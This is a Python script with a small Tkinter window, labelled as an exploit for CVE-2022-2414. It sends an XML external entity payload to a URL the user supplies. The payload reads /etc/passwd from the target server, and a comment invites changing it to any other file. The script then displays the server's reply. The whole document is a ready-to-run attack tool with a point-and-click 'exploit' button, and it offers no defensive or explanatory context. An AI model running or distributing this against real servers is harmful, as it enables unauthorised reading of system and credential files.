

#!/usr/bin/env python3
import requests
import json
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
root = tkinter.Tk()
root.title("CVE_2022_2414 exploits")
root.geometry('800x600+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    url = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)

# # change "/etc/passwd" to the file you want
    payload="""
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
    """
    headers = {'Content-Type': 'application/xml'}
    response = requests.post(url, data=payload, headers=headers, verify=False)

   # print("Status Code:", response.status_code)
   # print("XML Response:", response.text)
    txtarea.insert(END, "Status Code:\n")
    txtarea.insert(END, response.status_code)
    txtarea.insert(END, "\n----------------------------------------------\n")
    txtarea.insert(END, "XML Response:\n")
    txtarea.insert(END, response.text)
    txtarea.pack(fill=BOTH, expand=1)
Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()
